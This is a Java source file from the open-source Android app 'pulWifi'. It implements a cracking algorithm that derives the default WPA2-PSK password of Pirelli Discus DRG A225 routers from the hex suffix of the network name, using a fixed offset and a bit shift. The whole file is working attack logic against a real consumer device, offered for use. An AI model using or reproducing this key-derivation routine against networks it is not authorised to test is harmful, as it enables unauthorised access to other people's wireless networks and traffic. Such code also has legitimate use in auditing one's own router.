/*
 *  pulWifi , Copyright (C) 2011-2012 Javi Pulido / Antonio Vázquez
 *  
 *  This file is part of "pulWifi"
 *
 *  "pulWifi" is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  "pulWifi" is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with "pulWifi".  If not, see <http://www.gnu.org/licenses/>.
 */

package es.pulimento.wifi.core.algorithms;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * Discus cracking algorithm.
 * Pirelli Discuss DRG A225 router default WPA2-PSK password cracking algorithm.
 */
public class DiscusAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public DiscusAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	/**
	 * {@inheritDoc}
	 */
	@Override
	protected void setPatterns() {

		// BSSID: Discus--XXXXXX
		// ESSID: Any
		addPattern("Discus--([0-9a-fA-F]{6})", "([0-9A-Fa-f:]{17})");
	}

	/**
	 * {@inheritDoc}
	 */
	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		return "YW0" + Integer.toString((Integer.parseInt(essid_data, 16) - 0xD0EC31) >> 2);
	}

	/**
	 * {@inheritDoc}
	 */
	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return mCapabilities.equals(WirelessEncryption.WPA);
	}

}
